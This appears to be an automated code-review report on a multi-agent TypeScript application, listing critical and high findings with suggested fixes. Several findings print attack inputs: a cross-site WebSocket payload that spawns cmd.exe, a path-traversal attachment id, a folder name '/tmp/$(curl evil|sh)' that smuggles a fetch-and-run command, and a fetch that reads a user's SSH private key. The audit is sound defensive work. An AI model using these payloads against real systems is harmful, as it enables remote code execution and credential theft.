## 详情

### 1. [critical] Unauthenticated invoke plus no Origin check lets any web page run commands on the host (worker:task:execute)

- **位置**：`src/daemon/gateway/GatewayServer.ts:225`（区域：daemon）

**问题**

Verdict: REVISE. The authToken is checked only inside the 'link-open' branch (line 202). An 'invoke' envelope sent without a link-open first goes straight to the allowlist and handler at lines 225-286, because there is no per-client 'authenticated' state. handleWsUpgrade (line 121) also never checks the Origin header, and Access-Control-Allow-Origin is '*'. On top of that, cli.ts:43 passes MO_GATEWAY_TOKEN, which is unset by default, so normally there is no token at all. Attack: the user visits any web page, and its JavaScript runs `new WebSocket('ws://127.0.0.1:38080/gateway')` and sends {kind:'invoke',id:'1',payload:{channel:'worker:task:execute',args:{taskId:'x',command:'cmd.exe',args:['/c','...']}}}. WorkerManager.executeTask spawns it with a cwd and env the attacker controls, which is remote code execution. Even when a token is configured, skipping link-open gets around it. The same hole exposes session:relocate, rewind:commit, room:threads:delete (deletes files) and config:settings:update.

**修复建议**

Add a `private authed = new Set<string>()`. In the link-open branch, call authed.add(clientId) only when `!this.authToken || crypto.timingSafeEqual(...)` passes. At the top of processEnvelope, if kind !== 'ping' && kind !== 'link-open' && !authed.has(clientId), call socket.destroy() and return, and delete the entry in removeClient. In handleWsUpgrade, reject any upgrade whose Origin header is present and not on an allowlist (for example the desktop/web client origins), and require a non-empty authToken whenever host is not a loopback address.

### 2. [critical] createSession uses INSERT OR REPLACE on sessions, which cascade-deletes all child rows and resets unlisted columns

- **位置**：`src/storage/StorageManager.ts:1202`（区域：storage）

**问题**

Verdict: REVISE. The schema enables foreign keys (DatabaseSchema.ts:11 sets PRAGMA foreign_keys = ON, and node:sqlite also enforces them by default). messages, agent_input_queue_snapshots, subagent_runs and room_sessions all reference sessions(id) with ON DELETE CASCADE. When REPLACE hits a primary-key conflict, SQLite deletes the existing row and then inserts a new one. That delete fires the FK cascade. Any createSession call on a session that already exists therefore silently wipes that session's whole message timeline, its queued-input snapshot, its subagent runs and its room bindings. Real callers hit this: AgentOrchestrator.ts:886 (relocateSessionWorkingDir always re-calls createSession on the existing session) and AgentOrchestrator.ts:1041 (repairing a DM session's type or target). Even without the cascade, the REPLACE statement does not list plan_mode_enabled, pinned_at, cleared_at, last_reset_sequence, extra_dirs_json, writable_dirs_json, list_preview, list_message_count, project_dir or workspace_kind, so all of these reset to their defaults. Example: a user relocates a session's working directory and the full chat history disappears from the DB.

**修复建议**

Use an upsert: `INSERT INTO sessions (...) VALUES (...) ON CONFLICT(id) DO UPDATE SET project_slug=excluded.project_slug, session_type=excluded.session_type, target_id=excluded.target_id, title=excluded.title, cwd_path=excluded.cwd_path, claude_config_dir=excluded.claude_config_dir, model=excluded.model, provider_id=excluded.provider_id, effort=excluded.effort, permission_mode=excluded.permission_mode, sdk_session_id=excluded.sdk_session_id, parent_session_id=excluded.parent_session_id, forked_at_message_id=excluded.forked_at_message_id, context_window=excluded.context_window, updated_at=excluded.updated_at`. Leave counters and other columns untouched.

### 3. [critical] The client-supplied attachment id flows unsanitized into a file path, allowing arbitrary file writes

- **位置**：`src/web/server/controllers/messages-controller.ts:356`（区域：web-server）

**问题**

body.attachments is passed through unchanged (lines 356 and 565) to dispatchOrchestratorMessage. AgentOrchestrator.ts:1174-1180 then builds fileName = `${att.id}-${cleanName}` and writes it with path.join(attachmentsDir, fileName). Only att.name is sanitized; att.id is not. An attachment like {id:'../../src/web/server/x', name:'a.ts', data:'data:image/png;base64,<payload>'} writes attacker bytes outside data/attachments, for example into src/ or .githooks/. Vite or the daemon then loads that file, which gives code execution. Through the unauthenticated or CSRF entry point in finding 1 this is reachable remotely.

**修复建议**

Validate attachments in handlePostMessage: drop any client-provided id unless it matches /^[A-Za-z0-9_-]{1,64}$/, and cap the count and size. In AgentOrchestrator, always use crypto.randomUUID() for the file id and assert that path.resolve(filePath) starts with path.resolve(attachmentsDir)+path.sep before writing.

### 4. [critical] open-folder builds a shell command from an untrusted path (command injection) and creates directories anywhere

- **位置**：`src/web/server/controllers/workspace-controller.ts:371`（区域：web-server）

**问题**

targetPath comes from the request body, is resolved with no boundary check, is created with mkdirSync({recursive:true}) at line 367, and is then put into a shell string run by exec(): `open "${resolved}"` / `xdg-open "${resolved}"` / `explorer "${resolved}"`. On macOS/Linux, folderPath='/tmp/$(curl evil|sh)' is a valid directory name, so mkdir succeeds and the $(...) runs inside the double quotes. On Windows, cmd.exe still expands %VAR% inside the quotes, and the request creates directories at any location. Combined with finding 1, this can be triggered by CSRF.

**修复建议**

Replace exec with execFile/spawn and pass the path as an argument, with no shell: spawn(platform==='win32'?'explorer':platform==='darwin'?'open':'xdg-open',[resolved],{shell:false}). Require isSubpath(PROJECT_ROOT, fs.realpathSync(resolved)) or an allowlist of known workspace roots, and do not mkdir paths that do not already exist.

### 5. [critical] [verdict: REVISE] The whole /api surface has no auth, listens on 0.0.0.0, sends ACAO '*', and runs ahead of Vite's own host and CORS checks

- **位置**：`src/web/vite.config.ts:21`（区域：web-server）

**问题**

vite.config.ts:21 binds to 0.0.0.0. common.ts:169 sets 'Access-Control-Allow-Origin: *' on every JSON response. vite-room-api-plugin.ts:149 attaches the middleware directly inside configureServer, so it runs before Vite's internal allowedHosts/DNS-rebinding check and before its localhost-only CORS default. parseJsonBody (common.ts:200) never checks Content-Type, so a cross-site text/plain POST counts as a 'simple request' and gets no preflight. Three concrete attacks: (a) any web page the developer visits can run fetch('http://localhost:5173/api/workspaces/file?path=C:/Users/<u>/.ssh/id_rsa') and read the reply, because ACAO is '*'. (b) The same page can POST to /api/bots/<id>/chat (bots-controller.ts:660-703), which runs ClaudeSdkRunner with permissionLevel 'full' in PROJECT_ROOT. That is remote code execution via a prompt. (c) Any host on the LAN can do the same without a browser. Only the provider routes have isSameOrigin, and that check passes when Origin is absent (curl from the LAN) and under DNS rebinding (Origin host equals the attacker-controlled Host header).

**修复建议**

Set server.host to '127.0.0.1'. Remove the ACAO '*' header from setCorsHeaders. In the plugin entry, before any route runs, reject /api requests whose Host is not localhost/127.0.0.1:<port> or whose Origin is present and not same-origin. Also require 'Content-Type: application/json' on every POST/PUT/PATCH/DELETE.

### 6. [high] connect() leaks the previous WebSocket, and stale listener callbacks reconnect to the old config

- **位置**：`clients/android/app/src/main/java/com/multiagent/companion/data/websocket/GatewayWebSocketClient.kt:73`（区域：clients）

**问题**

FeedScreen's onSave calls viewModel.connect(newConfig) while a socket is already open. connect() never closes the existing webSocket; it only overwrites the reference (line 98). The old socket stays open: it keeps delivering pushes from the old gateway/room into the same feed (duplicated or mixed cards), and its link-accept or heartbeat state stays active. When the old socket later closes or fails, its listener (created with the OLD config, lines 117-135) sees intentionalDisconnect==false and calls scheduleReconnect(oldConfig). That cancels the new reconnectJob and overwrites webSocket with a connection to the old host. The same race happens after disconnect() followed quickly by connect(), because the old onClosed fires after intentionalDisconnect has been reset to false. As a result, user settings changes silently revert and the emergency stop can be sent to the wrong gateway.

**修复建议**

In connect(), close and null the existing socket before performConnect: webSocket?.cancel(); heartbeatJob?.cancel(). In every listener callback, ignore events from stale sockets: if (ws !== webSocket) return. Optionally track a connection generation counter that is captured in createListener and checked in scheduleReconnect.

### 7. [high] spawnSync of tsc.cmd without shell always fails on Windows, so the desktop build cannot run

- **位置**：`clients/desktop/scripts/build.mjs:39`（区域：clients）

**问题**

tscPath resolves to node_modules/.bin/tsc.cmd on win32. On patched Node versions (>=18.20.2/20.12.2/21.7.3), spawnSync on a .cmd/.bat file without shell:true returns error EINVAL with status null. tscExec.status !== 0 then becomes true, and process.exit(null || 1) exits with code 1. tscExec.error is never printed, so 'npm run build' on Windows (the primary dev platform here) fails every time with only 'failed with code: null'.

**修复建议**

Call the TypeScript JS entry with node directly: spawnSync(process.execPath, [path.join(desktopRoot,'node_modules','typescript','bin','tsc'), '-p', path.join(desktopRoot,'tsconfig.json')], {cwd: desktopRoot, stdio:'inherit'}). Also log tscExec.error when it is set.

### 8. [high] spawn('npx') without shell fails on Windows, and the missing 'error' listener crashes the Electron main process

- **位置**：`clients/desktop/src/main/daemon-lifecycle.ts:151`（区域：clients）

**问题**

On win32 'npx' is npx.cmd. spawn('npx', [...]) with no shell option emits an asynchronous 'error' event (ENOENT). Node releases with the CVE-2024-27980 hardening (>=18.20.2/20.12.2, which includes Electron 33's Node 20.18) also reject .cmd targets without a shell. The surrounding try/catch cannot catch an async event, and no childProcess.on('error') handler is registered. Electron therefore raises an uncaught exception in the main process (error dialog or crash) on every Windows launch where the daemon is not already running. Before that, waitForHealth spins for 15s and leaves status 'unhealthy' while pid shows a dead process.

**修复建议**

Do not go through npx. Use spawn(process.execPath, [require.resolve('tsx/cli', {paths:[projectRoot]}), cliScript, 'start'], {env:{...env, ELECTRON_RUN_AS_NODE:'1'}, ...}). Alternatively, use spawn(process.platform==='win32'?'npx.cmd':'npx', args, {shell: process.platform==='win32'}) with quoted args. In both cases add this.childProcess.on('error', err => { this.status.state='stopped'; this.status.error=err.message; this.emit('status', this.getStatus()); }) before awaiting health.

### 9. [high] String.prototype.replace treats user and LLM text as a replacement pattern, so $-sequences corrupt the prompt

- **位置**：`Customizations/plugins/prompt-distill/scripts/handler.mjs:183`（区域：customizations）

**问题**

round1Tpl.replace('{{USER_RAW}}', rawPrompt) at line 183, distillTpl.replace(..., prevAssistantRaw) at line 227, and the 5-step nextTurnTpl.replace chain at lines 245-250 all pass untrusted text as the replacement string. In that string, JS expands $& (the matched placeholder), $` (all template text before the match) and $' (all template text after it), and collapses $$ to $. These sequences are common in engineering prompts, e.g. bash `echo $'a\nb'`, regex snippets with `$&`, or PowerShell `$$`. Example: the user types `sed 's/x/$&y/'`. The model then receives the literal `{{USER_RAW}}` instead of the user's text, or for $' the whole rest of the template is spliced into the middle of the user's text. The distillation is then wrong, and because the guardrail compares against rawPrompt, it can still pass and be injected as additionalContext. The chain has a second problem: placeholders are replaced in order, so if ROOT_OBJECTIVE or RECENT_DISTILLATIONS content contains a literal later placeholder such as `{{USER_RAW}}`, the later .replace hits that copy instead of the template slot.
